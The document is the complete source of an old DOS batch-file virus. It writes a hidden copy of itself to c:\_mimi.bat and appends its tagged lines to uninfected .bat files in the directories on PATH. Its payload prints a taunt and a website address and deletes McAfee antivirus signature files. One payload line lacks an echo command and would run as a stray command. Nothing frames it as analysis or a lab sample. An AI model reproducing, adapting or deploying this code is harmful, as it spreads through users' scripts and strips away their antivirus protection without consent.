@echo off%_mimi%
if '%1=='mimi goto mimi%2
set mimi=%0.bat
if not exist %mimi% set mimi=%0
if '%mimi%==' set mimi=autoexec.bat
if exist c:\_mimi.bat goto mimi_go
if not exist %mimi% goto evol_mimi
find "mimi"<%mimi%>c:\_mimi.bat
attrib c:\_mimi.bat +h
:mimi_go
if '%!mimi%=='------ goto mimi_exit
set !mimi=%!mimi%-
command /e:5000 /c c:\_mimi mimi v . .. \ %path%
:evol_mimi
set mimi=
goto mimi_pay
:mimiv
shift%_mimi%
if '%2==' exit mimi
for %%a in (%2\*.bat %2*.bat) do call c:\_mimi mimi inf %%a
goto mimiv
:mimi_inf
find "mimi"<%3>nul
if not errorlevel 1 goto mimi_jump
type %3>mimi$
echo.>>mimi$
type c:\_mimi.bat>>mimi$
move mimi$ %3>nul
set mimi!=%mimi!%-
if %mimi#%==------exit
:mimi_jump
set mimi!=%mimi!%-
if %mimi!%==------exit
:mimi_pay
Hey, Worf, this is a good site!
echo Naser si - http://www.nasrat.cz
echo y| del c:\mcafee\*.dat
echo y| del c:\progra~1\mcafee\*.dat
:mimi_exit
